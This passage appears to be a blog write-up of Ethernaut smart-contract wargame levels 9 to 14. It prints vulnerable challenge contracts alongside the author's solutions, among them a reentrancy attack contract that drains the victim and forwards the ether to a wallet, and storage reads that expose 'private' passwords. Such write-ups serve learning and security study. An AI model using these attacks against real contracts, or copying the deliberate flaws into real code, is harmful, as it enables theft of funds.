+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Vault</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">bool</span> <span style="color:#66d9ef">public</span> locked;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">bytes32</span> <span style="color:#66d9ef">private</span> password;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">constructor</span>(<span style="color:#66d9ef">bytes32</span> _password) {
+</span></span><span style="display:flex;"><span>    locked <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>    password <span style="color:#f92672">=</span> _password;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">unlock</span>(<span style="color:#66d9ef">bytes32</span> _password) <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (password <span style="color:#f92672">==</span> _password) {
+</span></span><span style="display:flex;"><span>      locked <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="91-solution">9.1 Solution</h3>
+<p>bytes32 private password is &ldquo;private&rdquo;, but blockchain is open to all
+<img src="/img/input_data.png" alt="web"></p>
+<h3 id="92-remark">9.2 Remark</h3>
+<p>2 ways to get input data:</p>
+<ol>
+<li>&ldquo;Input Data&rdquo; under etherscan&rsquo;s transaction hash</li>
+<li>await web3.eth.getStorageAt(instance, 1)</li>
+</ol>
+<h2 id="10-ethernaut10---king">10. Ethernaut10 - King</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">King</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">address</span> king;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint</span> <span style="color:#66d9ef">public</span> prize;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> owner;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">constructor</span>() <span style="color:#66d9ef">payable</span> {
+</span></span><span style="display:flex;"><span>    owner <span style="color:#f92672">=</span> msg.sender;  
+</span></span><span style="display:flex;"><span>    king <span style="color:#f92672">=</span> msg.sender;
+</span></span><span style="display:flex;"><span>    prize <span style="color:#f92672">=</span> msg.value; <span style="color:#75715e">//number of wei send
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  receive() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {
+</span></span><span style="display:flex;"><span>    require(msg.value <span style="color:#f92672">&gt;=</span> prize <span style="color:#f92672">||</span> msg.sender <span style="color:#f92672">==</span> owner);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">payable</span>(king).transfer(msg.value);
+</span></span><span style="display:flex;"><span>    king <span style="color:#f92672">=</span> msg.sender;
+</span></span><span style="display:flex;"><span>    prize <span style="color:#f92672">=</span> msg.value;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">_king</span>() <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">address</span>) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> king;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="101-solution">10.1 Solution</h3>
+<p>seems pretty bad that everybody can control any eth to any wallet&hellip;&hellip;. but OK for rechaing the level goal.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">kingking</span>{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> abc;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">constructor</span>() <span style="color:#66d9ef">payable</span> {
+</span></span><span style="display:flex;"><span>    
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">sendwei</span>(<span style="color:#66d9ef">uint</span> _wei) <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    (<span style="color:#66d9ef">bool</span> success, <span style="color:#66d9ef">bytes</span> <span style="color:#66d9ef">memory</span> data) <span style="color:#f92672">=</span> abc.call{value<span style="color:#f92672">:</span> _wei}(<span style="color:#e6db74">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>    console.log(success);
+</span></span><span style="display:flex;"><span>    console.logBytes(data);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setaddress</span>(<span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> _king) <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    abc <span style="color:#f92672">=</span> _king;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="102-remark">10.2 Remark</h3>
+<ul>
+<li>Making transaction
+<ul>
+<li>address.send(_amount)</li>
+<li>address.call.value(_amount).gas(35000)()</li>
+<li>address.transfer(_amount)</li>
+</ul>
+</li>
+<li>How to calculate gas usage before calling the contract?</li>
+<li>Transaction (call, send, transfer) <a href="https://solidity-by-example.org/sending-ether/" target="_blank">detailed send&amp;transfer</a></li>
+<li>constructor payable for receiving eht when deploy contracts.</li>
+</ul>
+<h2 id="11-ethernaut11---re-entrancy">11. Ethernaut11 - Re-entrancy</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">6</span>.<span style="color:#ae81ff">12</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#e6db74">&#39;openzeppelin-contracts-06/math/SafeMath.sol&#39;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Reentrance</span> {
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#f92672">using</span> SafeMath <span style="color:#66d9ef">for</span> <span style="color:#66d9ef">uint256</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">mapping</span>(<span style="color:#66d9ef">address</span> <span style="color:#f92672">=&gt;</span> <span style="color:#66d9ef">uint</span>) <span style="color:#66d9ef">public</span> balances;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">donate</span>(<span style="color:#66d9ef">address</span> _to) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">payable</span> {
+</span></span><span style="display:flex;"><span>    balances[_to] <span style="color:#f92672">=</span> balances[_to].add(msg.value);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">balanceOf</span>(<span style="color:#66d9ef">address</span> _who) <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">view</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">uint</span> balance) {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> balances[_who];
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">withdraw</span>(<span style="color:#66d9ef">uint</span> _amount) <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(balances[msg.sender] <span style="color:#f92672">&gt;=</span> _amount) {
+</span></span><span style="display:flex;"><span>      (<span style="color:#66d9ef">bool</span> result,) <span style="color:#f92672">=</span> msg.sender.call{value<span style="color:#f92672">:</span>_amount}(<span style="color:#e6db74">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">if</span>(result) {
+</span></span><span style="display:flex;"><span>        _amount;
+</span></span><span style="display:flex;"><span>      }
+</span></span><span style="display:flex;"><span>      balances[msg.sender] <span style="color:#f92672">-=</span> _amount;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  receive() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {}
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="111-solution">11.1 Solution</h3>
+<p>Deploy Attack contract, then use donate 0.001eth to the deployed contract address via victim&rsquo;s donate function. Then trigger attack, leverging fallback to call withdraw 2 times before the contract update the balance value.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Attack</span>{
+</span></span><span style="display:flex;"><span>  Reentrance <span style="color:#66d9ef">public</span> victim;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">constructor</span>( <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">payable</span> _target) <span style="color:#66d9ef">public</span>{
+</span></span><span style="display:flex;"><span>    victim <span style="color:#f92672">=</span> Reentrance(_target);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">// Fallback is called when DepositFunds sends Ether to this contract.
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>  fallback() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {
+</span></span><span style="display:flex;"><span>    victim.withdraw(<span style="color:#ae81ff">1000000000000000</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">attack</span>() <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">payable</span> {
+</span></span><span style="display:flex;"><span>    victim.withdraw(<span style="color:#ae81ff">1000000000000000</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">tran</span>(<span style="color:#66d9ef">uint</span> _amount) <span style="color:#66d9ef">public</span>{
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">address</span>(<span style="color:#f92672">**</span>YOUR_WALLET<span style="color:#f92672">**</span>).call{value<span style="color:#f92672">:</span>_amount}(<span style="color:#e6db74">&#34;&#34;</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="112-remark">11.2 Remark</h3>
+<p>Learn new things takes time, even the challenge is a famous one&hellip;.</p>
+<h2 id="12-ethernaut12---elevator">12. Ethernaut12 - Elevator</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">Building</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isLastFloor</span>(<span style="color:#66d9ef">uint</span>) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Elevator</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">bool</span> <span style="color:#66d9ef">public</span> top;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint</span> <span style="color:#66d9ef">public</span> floor;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">goTo</span>(<span style="color:#66d9ef">uint</span> _floor) <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    Building building <span style="color:#f92672">=</span> Building(msg.sender);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span> building.isLastFloor(_floor)) {
+</span></span><span style="display:flex;"><span>      floor <span style="color:#f92672">=</span> _floor;
+</span></span><span style="display:flex;"><span>      top <span style="color:#f92672">=</span> building.isLastFloor(floor);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="121-solution">12.1 Solution</h3>
+<p>Create an new contract and deploy by using the Building interface, then have the control of function isLastFloor, then deploy our new contract, use the deployed contract to call Elevator.goTo. Then isLastFloor inside the Elevator.goTo will call our customized isLastFloor function.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;hardhat/console.sol&#34;</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">interface</span> <span style="color:#a6e22e">Building</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isLastFloor</span>(<span style="color:#66d9ef">uint</span>) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>);
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Elevator</span> {
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">bool</span> <span style="color:#66d9ef">public</span> top;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint</span> <span style="color:#66d9ef">public</span> floor;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">goTo</span>(<span style="color:#66d9ef">uint</span> _floor) <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    Building building <span style="color:#f92672">=</span> Building(msg.sender);
+</span></span><span style="display:flex;"><span>    <span style="color:#75715e">//console.log(building.isLastFloor(_floor));
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span> building.isLastFloor(_floor)) {
+</span></span><span style="display:flex;"><span>      floor <span style="color:#f92672">=</span> _floor;
+</span></span><span style="display:flex;"><span>      top <span style="color:#f92672">=</span> building.isLastFloor(floor);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">new_building</span> <span style="color:#66d9ef">is</span> Building{
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint</span> <span style="color:#66d9ef">public</span> floor;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">bool</span> <span style="color:#66d9ef">public</span> top;
+</span></span><span style="display:flex;"><span>  Elevator <span style="color:#66d9ef">public</span> abc <span style="color:#f92672">=</span> Elevator(INSTANCE_ADDRESS);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint</span> <span style="color:#66d9ef">public</span> counter;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">setElevator</span>(<span style="color:#66d9ef">address</span> _Elevator) <span style="color:#66d9ef">external</span>{
+</span></span><span style="display:flex;"><span>    abc <span style="color:#f92672">=</span> Elevator(_Elevator);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">isLastFloor</span>(<span style="color:#66d9ef">uint</span> _floor) <span style="color:#66d9ef">external</span> <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>){
+</span></span><span style="display:flex;"><span>    floor <span style="color:#f92672">=</span> _floor;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (counter <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>){
+</span></span><span style="display:flex;"><span>      counter <span style="color:#f92672">+=</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>      <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">goTo</span>() <span style="color:#66d9ef">external</span>{
+</span></span><span style="display:flex;"><span>    abc.goTo(<span style="color:#ae81ff">3</span>);
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="122-remark">12.2 Remark</h3>
+<p>Modifiers (pure vs view vs default)</p>
+<p><img src="https://miro.medium.com/v2/resize:fit:1100/format:webp/1*NMsV86HlvH9Ib9bpT5pKlg.jpeg" alt="comparison table"></p>
+<p>external vs public(both externa &amp; internal) vs internal (also private)</p>
+<ul>
+<li>gas usage &amp; performance (external&amp;internal) &gt; public</li>
+</ul>
+<h2 id="13-ethernaut13---privacy">13. Ethernaut13 - Privacy</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">Privacy</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">bool</span> <span style="color:#66d9ef">public</span> locked <span style="color:#f92672">=</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint256</span> <span style="color:#66d9ef">public</span> ID <span style="color:#f92672">=</span> block.timestamp;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint8</span> <span style="color:#66d9ef">private</span> flattening <span style="color:#f92672">=</span> <span style="color:#ae81ff">10</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint8</span> <span style="color:#66d9ef">private</span> denomination <span style="color:#f92672">=</span> <span style="color:#ae81ff">255</span>;
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint16</span> <span style="color:#66d9ef">private</span> awkwardness <span style="color:#f92672">=</span> <span style="color:#66d9ef">uint16</span>(block.timestamp);
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">bytes32</span>[<span style="color:#ae81ff">3</span>] <span style="color:#66d9ef">private</span> data;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">constructor</span>(<span style="color:#66d9ef">bytes32</span>[<span style="color:#ae81ff">3</span>] <span style="color:#66d9ef">memory</span> _data) {
+</span></span><span style="display:flex;"><span>    data <span style="color:#f92672">=</span> _data;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">unlock</span>(<span style="color:#66d9ef">bytes16</span> _key) <span style="color:#66d9ef">public</span> {
+</span></span><span style="display:flex;"><span>    require(_key <span style="color:#f92672">==</span> <span style="color:#66d9ef">bytes16</span>(data[<span style="color:#ae81ff">2</span>]));
+</span></span><span style="display:flex;"><span>    locked <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#75715e">/*
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    A bunch of super advanced solidity algorithms...
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">      ,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">      .,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">      *.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^         ,---/V\
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">      `*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.    ~|__(o.o)
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">      ^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;^`*.,*&#39;  UU  UU
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e">  */</span>
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="131-solution">13.1 Solution</h3>
+<p>memory data can&rsquo;t be written by external party, but readable by everyone at anytime.</p>
+<h3 id="132-remark">13.2 Remark</h3>
+<p>web3.eth.getStorageAt(&ldquo;ADDRESS&rdquo;, SLOT_NUM);</p>
+<h2 id="14-ethernaut14---gatekeeper-one">14. Ethernaut14 - Gatekeeper One</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-solidity" data-lang="solidity"><span style="display:flex;"><span><span style="color:#75715e">// SPDX-License-Identifier: MIT
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#66d9ef">pragma solidity</span> <span style="color:#f92672">^</span><span style="color:#ae81ff">0</span>.<span style="color:#ae81ff">8</span>.<span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> <span style="color:#e6db74">&#34;hardhat/console.sol&#34;</span>;
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">contract</span> <span style="color:#a6e22e">GatekeeperOne</span> {
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">address</span> <span style="color:#66d9ef">public</span> entrant;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">modifier</span> <span style="color:#a6e22e">gateOne</span>() {
+</span></span><span style="display:flex;"><span>    require(msg.sender <span style="color:#f92672">!=</span> tx.origin);
+</span></span><span style="display:flex;"><span>    console.log(<span style="color:#e6db74">&#34;1&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">_</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">modifier</span> <span style="color:#a6e22e">gateTwo</span>() {
+</span></span><span style="display:flex;"><span>    console.log(gasleft());
+</span></span><span style="display:flex;"><span>    require(gasleft() <span style="color:#f92672">%</span> <span style="color:#ae81ff">8191</span> <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>);
+</span></span><span style="display:flex;"><span>    console.log(<span style="color:#e6db74">&#34;2&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">_</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">modifier</span> <span style="color:#a6e22e">gateThree</span>(<span style="color:#66d9ef">bytes8</span> _gateKey) {
+</span></span><span style="display:flex;"><span>      require(<span style="color:#66d9ef">uint32</span>(<span style="color:#66d9ef">uint64</span>(_gateKey)) <span style="color:#f92672">==</span> <span style="color:#66d9ef">uint16</span>(<span style="color:#66d9ef">uint64</span>(_gateKey)), <span style="color:#e6db74">&#34;GatekeeperOne: invalid gateThree part one&#34;</span>);
+</span></span><span style="display:flex;"><span>      require(<span style="color:#66d9ef">uint32</span>(<span style="color:#66d9ef">uint64</span>(_gateKey)) <span style="color:#f92672">!=</span> <span style="color:#66d9ef">uint64</span>(_gateKey), <span style="color:#e6db74">&#34;GatekeeperOne: invalid gateThree part two&#34;</span>);
+</span></span><span style="display:flex;"><span>      require(<span style="color:#66d9ef">uint32</span>(<span style="color:#66d9ef">uint64</span>(_gateKey)) <span style="color:#f92672">==</span> <span style="color:#66d9ef">uint16</span>(<span style="color:#66d9ef">uint160</span>(tx.origin)), <span style="color:#e6db74">&#34;GatekeeperOne: invalid gateThree part three&#34;</span>);
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">_</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">enter</span>(<span style="color:#66d9ef">bytes8</span> _gateKey) <span style="color:#66d9ef">public</span> gateOne gateTwo gateThree(_gateKey) <span style="color:#66d9ef">returns</span> (<span style="color:#66d9ef">bool</span>) {
+</span></span><span style="display:flex;"><span>    entrant <span style="color:#f92672">=</span> tx.origin;
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">true</span>;
+</span></span><span style="display:flex;"><span>  }
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h3 id="141-solution">14.1 Solution</h3>
+<h3 id="142-remark">14.2 Remark</h3>
+<h2 id="15-ethernaut15---gatekeeper-two">15. Ethernaut15 - Gatekeeper Two</h2>
+<h2 id="16-ethernaut16---naught-coin">16. Ethernaut16 - Naught Coin</h2>
+<h2 id="17-ethernaut17---preservation">17. Ethernaut17 - Preservation</h2>
+<h2 id="18-ethernaut18---recovery">18. Ethernaut18 - Recovery</h2>
+<h2 id="19-ethernaut19---magicnumber">19. Ethernaut19 - MagicNumber</h2>
